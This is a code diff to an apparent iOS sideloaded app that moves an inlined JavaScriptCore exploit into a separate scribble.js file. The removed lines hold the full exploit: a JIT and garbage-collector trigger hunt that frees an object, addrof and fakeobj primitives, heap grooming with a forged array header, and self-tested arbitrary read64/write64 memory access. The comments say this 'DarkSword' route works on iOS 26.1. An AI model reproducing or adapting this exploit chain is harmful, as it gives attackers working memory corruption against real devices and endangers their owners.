@@ -14,6 +14,9 @@
 // JSC read/write from addrof+fakeobj, without forging any PAC signature
 // (the DarkSword "scribble" route, proven on iOS 26.1 with this same CVE).
 //
+// The script itself is Resources/scribble.js -- loaded, never inlined, so the
+// Objective-C lexer never sees JS.
+//
 // Runs in a JSContext (JavaScriptCore inside OUR process) -- NOT a WKWebView:
 // on this build WebKit2 refuses to initialise inside a sideloaded app
 // (SIGTRAP in WebKit::InitializeWebKit2), while JavaScriptCore works fine and the
@@ -24,171 +27,31 @@
 //  1. The script NEVER lets an exception escape to Objective-C.  Every phase
 //     runs inside guard(); a RangeError from the deep GC-recursion warmup or a
 //     TypeError from a mistyped slot used to abort the whole script, land in
-//     [ctx exception], and then [-[JSValue toString]] handed back an object
+//     [ctx exception], and then -[JSValue toString] handed back an object
 //     whose description path BRKs in objc_opt_respondsToSelector (SIGTRAP) --
 //     the app died with no verdict at all.  Now the script always ends with
-//     JSON.stringify(), so Objective-C only ever sees a plain NSString.
+//     JSON.stringify(), so Objective-C only ever sees a plain NSString, taken
+//     through the sanctioned toObject bridge rather than a JS re-entry.
 //
 //  2. The trigger hunt is wall-clock bounded (150 s) and reports live progress,
 //     because the per-round cost is ~10M JS calls and the loop allowed 10000
 //     rounds: it used to grind for many minutes and "hang" the module.
 // ===========================================================================
-static const char *kScribble = R"JS(
-(function () {
-  var out = { step: [], exp: {}, guard: [], phase: 'start' };
-  function guard(name, fn) {
-    out.phase = name;
-    try { fn(); out.step.push(name + ':ok'); return true; }
-    catch (e) {
-      var m = 'no message';
-      try { m = String(e); } catch (e2) { m = 'unstringifiable'; }
-      out.guard.push(name + ': ' + m);
-      out.step.push(name + ':FAILED');
-      return false;
-    }
-  }
-
-  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
-  var itof = function (v) { u[0] = v; return d[0]; };
-  var ftoi = function (f) { d[0] = f; return u[0]; };
-  var OFF = 0x0002000000000000n;
-  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);   // ArrayWithDouble | ArrayType | White
-
-  var BUDGET = 150000, t0 = Date.now(), rounds = 0;
-  var arr, arr_index, W = null, HA, SA, gap, changeArr, holder, scribble;
-
-  function foo(flag, k, allocCount) {
-    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-    arr[arr_index] = A; let forGC = [];
-    let a = new Date(1111); a[0] = 1.1;
-    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
-    A.p2 = forGC;
-    let b = { p0: 0x42424242, p1: 1.1 };
-    let f; f = b; if (flag) { f = 1.1; }
-    A.p1 = f; let v = 1.1;
-    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
-    b.p0 = v; b.p1 = a;
-  }
-  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
-
-  guard('carrier', function () {
-    arr = new Array(0x400000).fill(1.1);
-    arr_index = arr.length - 1;
-  });
-
-  // Warmup: the deep recursion is a GC-pressure trick from the original PoC and
-  // it can throw RangeError on a small native stack -- that must NOT abort the
-  // run, it only costs us the grooming round.
-  aveStep('init: carrier allocated, warming up the JIT (the one-time slow phase)');
-  guard('warmup', function () {
-    foo(true, 1, 1); foo(false, 1, 1);
-    for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
-    for (let i = 0; i < 10000; i++) rec(i);
-  });
-  out.exp.warmupMs = Date.now() - t0;
-  aveStep('warmup done in ' + out.exp.warmupMs + 'ms, warnings=' + out.guard.length +
-          ', starting the trigger hunt');
-
-  guard('hunt', function () {
-    for (let k = 0; k < 10000 && !W; ++k) {
-      rounds = k + 1;
-      // OSR cost: full inner loops while foo/rec tier up, then a much cheaper
-      // variant so more rounds fit into the time budget.
-      var kk = (k < 30) ? 10 : 2;
-      foo(false, kk, k % 5 + 1);
-      rec(2000);
-      for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
-      let fr = arr[arr_index].p1.p1;
-      let noCow = 13.37;
-      for (let i = 0; i < 16; ++i) {
-        let c = [13.37, 2.2, 3.3, 4.4, noCow];
-        if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
-      }
-      if (k % 25 === 24) aveStep('hunt round=' + rounds +
-                                  ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
-      if (Date.now() - t0 > BUDGET) { out.exp.budgetReached = true; break; }
-    }
-  });
-  out.exp.rounds = rounds;
-  out.exp.huntMs = Date.now() - t0;
-  aveStep('hunt finished: rounds=' + rounds + ' in ' + out.exp.huntMs +
-          'ms, trigger=' + (W ? 'FIRED at round ' + W.round : 'no'));
-
-  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
-  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }
-
-  guard('groom', function () {
-    if (!W) throw 'trigger did not fire';
-    holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
-    scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
-    HA = addrof(holder), SA = addrof(scribble), gap = SA - HA;
-    for (var t = 0; t < 60 && gap !== 0x40n && gap !== -0x40n; t++) {
-      holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
-      scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
-      HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
-    }
-    out.gap = gap.toString();
-    if (gap !== 0x40n && gap !== -0x40n) throw 'groom failed';
-    out.step.push('groom ok gap=' + gap);
-  });
-
-  guard('primitive', function () {
-    if (gap !== 0x40n && gap !== -0x40n) throw 'no groomed pair';
-    scribble.p7 = 3.3; scribble[0] = 1.1;
-    holder.p1 = itof(HDR);
-    holder.p2 = scribble;
-    changeArr = fakeobj(HA - 1n + 0x10n + 1n);
-    function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }
-
-    // E2: does the element fast path ignore StructureID?
-    var HDR_JUNK = HDR | 0xdeadbeefn;
-    holder.p1 = itof(HDR_JUNK);
-    var junkEl = null;
-    try { junkEl = ftoi(changeArr[0]); } catch (e) { junkEl = 'threw'; }
-    out.exp.elementPathIgnoresSID = (junkEl !== 'threw');
-    holder.p1 = itof(HDR);
-
-    function write64(addr, val) {
-      setBtf(BigInt(addr));
-      try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
-    }
-    function read64(addr) {
-      setBtf(BigInt(addr));
-      try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
-    }
-
-    var ta = new BigUint64Array(16);
-    ta[0] = 0x4142434445464748n;
-    var w = write64(addrof(ta) - 1n + 0x18n, 0x0000000000010000n);
-    out.lengthWrite = w;
-    out.lengthAfter = ta.length;
-    out.write = (w && ta.length === 65536);
-    out.read = (ta[0] === 0x4142434445464748n);
-    out.value = '0x' + ta[0].toString(16);
-    out.step.push('primitive: write=' + out.write + ' read=' + out.read);
-  });
-
-  aveStep('phases: ' + out.step.join(' | '));
-  return JSON.stringify(out);
-})()
-)JS";
 
 // Run JS in a JSContext (JavaScriptCore, no WebKit2).  Returns the string result.
 // aveStep() is exported into the context so the script can report live progress
-// into the device log while it runs.  The result is ALWAYS converted to a plain
-// NSString built from JS's own JSON.stringify() -- no JSValue is ever handed
-// back to Objective-C formatting code.
-static NSString *RunJS(const char *js) {
+// into the device log while it runs.
+static NSString *RunJS(NSString *src, NSString *tag) {
     @autoreleasepool {
         JSContext *ctx = [[JSContext alloc] init];
-        __block NSString *res = nil;
+        NSString *res = @"(no answer)";
         ctx[@"aveStep"] = ^(id s) {
             NSString *line = [s isKindOfClass:[NSString class]] ? s : @"?";
             AveLog([NSString stringWithFormat:@"    js. %@", line]);
-            AvePost([NSString stringWithFormat:@"SCRIBBLE STEP %@", line]);
+            AvePost([NSString stringWithFormat:@"%@ STEP %@", tag, line]);
         };
         @try {
-            JSValue *v = [ctx evaluateScript:[NSString stringWithUTF8String:js]];
+            JSValue *v = [ctx evaluateScript:src];
             JSValue *exc = [ctx exception];
             if (exc) {
                 // toObject() is the sanctioned bridge and does not re-enter JS
@@ -212,11 +75,19 @@ static NSString *RunJS(const char *js) {
 }
 
 NSString *ModJscScribbleRW(void) {
-    AveLog(@"    JSC scribble R/W: DarkSword route inside a JSContext (no WKWebView)");
-    NSString *r = RunJS(kScribble);
+    AveLog(@"    JSC scribble R/W: DarkSword route from scribble.js (no WKWebView)");
+    NSString *src = LoadJS(@"scribble.js");
+    if (!src) {
+        AvePost(@"SCRIBBLE scribble.js missing from the bundle");
+        return @"scribble.js missing from the bundle";
+    }
+    NSString *r = RunJS(src, @"SCRIBBLE");
     AveLog([NSString stringWithFormat:@"    scribble result: %@", r]);
     AvePost([NSString stringWithFormat:@"SCRIBBLE %@", r]);
-    if ([r containsString:@"\"write\":true"] && [r containsString:@"\"read\":true]) {
+    char q = '"';
+    NSString *wok = [NSString stringWithFormat:@"%cwrite%c:true", q, q];
+    NSString *rok = [NSString stringWithFormat:@"%cread%c:true", q, q];
+    if ([r containsString:wok] && [r containsString:rok]) {
         AveSetStatus(@"arbitrary R/W ACTIVE in our own process, no PAC needed");
         return @"ARBITRARY R/W ACTIVE on 23C5027f: read64/write64 self-tested";
     }
